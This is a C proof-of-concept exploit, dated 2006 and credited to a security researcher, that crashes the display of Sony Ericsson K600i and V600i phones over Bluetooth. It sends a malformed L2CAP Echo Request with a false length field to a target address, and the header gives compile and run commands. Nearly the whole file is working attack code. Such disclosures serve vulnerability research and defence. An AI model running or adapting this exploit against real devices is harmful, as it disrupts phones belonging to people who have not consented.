/*	Sony/Ericsson K600i reset display - PoC			*/
/* 	Pierre BETOUIN <pierre.betouin@security-labs.org>	*/
/*	02-01-2006						*/
/*	Vulnerability found using BSS fuzzer :			*/
/*		http://securitech.homeunix.org/blue/		*/
/*								*/
/*	Causes anormal behaviours on some Sony/Ericsson 	*/
/*	cell phones 						*/
/*	Vulnerable tested devices :				*/
/*		- K 600i					*/
/*		- V 600i					*/
/*		- And maybe other ones... 			*/
/*								*/
/*	Vulnerable devices will slowly turn their screen into 	*/
/*	black and then display a white screen. 			*/
/*	After a short period (~45sec), they will go back to 	*/
/*	their normal behaviour					*/
/*								*/
/*	gcc -lbluetooth reset_display_K600i.c 			*/
/*		-o reset_display_K600i				*/
/*	./reset_display_K600i 00:12:EE:XX:XX:XX			*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/l2cap.h>

#define SIZE		15
#define FAKE_SIZE	12

/* 
 * Main function to establish an L2CAP connection to a Bluetooth device 
 * and send an L2CAP Echo Request packet.
 * 
 * Arguments:
 * - argc: Count of command-line arguments.
 * - argv: Array of command-line arguments, where the first argument should be the Bluetooth address.
 * 
 * Steps:
 * 1. Checks if the Bluetooth address is provided.
 * 2. Creates a raw L2CAP socket.
 * 3. Binds the socket to the local Bluetooth adapter.
 * 4. Converts the provided Bluetooth address and attempts to connect to it.
 * 5. Allocates memory for the L2CAP packet and prepares the Echo Request packet.
 * 6. Sends the packet and displays the sent packet in hexadecimal format.
 * 7. Frees allocated memory and closes the socket.
 * 
 * Returns:
 * - EXIT_SUCCESS (0) on successful execution.
 * - Exits with an error message and EXIT_FAILURE otherwise.
 */
int main(int argc, char **argv)
{
	char *buffer;
	l2cap_cmd_hdr *cmd;	
	struct sockaddr_l2 addr;
	int sock, sent, i;

	if(argc < 2)
	{
		fprintf(stderr, "%s <btaddr>\n", argv[0]);
		exit(EXIT_FAILURE);
	}
	
	if ((sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) 
	{
		perror("socket");
		exit(EXIT_FAILURE);
	}

	memset(&addr, 0, sizeof(addr));
	addr.l2_family = AF_BLUETOOTH;

	if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) 
	{
		perror("bind");
		exit(EXIT_FAILURE);
	}

	str2ba(argv[1], &addr.l2_bdaddr);
	
	if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) 
	{
		perror("connect");
		exit(EXIT_FAILURE);
	}
	
	if(!(buffer = (char *) malloc ((int) SIZE + 1))) 
	{
		perror("malloc");
		exit(EXIT_FAILURE);
	}
	
	memset(buffer, 'A', SIZE);

	cmd = (l2cap_cmd_hdr *) buffer;
	cmd->code = L2CAP_ECHO_REQ;
	cmd->ident = 1;
	cmd->len = FAKE_SIZE;
	
	if( (sent=send(sock, buffer, SIZE, 0)) >= 0)
	{
		printf("L2CAP packet sent (%d)\n", sent);
	}

	printf("Buffer:\t");
	for(i=0; i<sent; i++)
		printf("%.2X ", (unsigned char) buffer[i]);
	printf("\n");

	free(buffer);
	close(sock);
	return EXIT_SUCCESS;
}
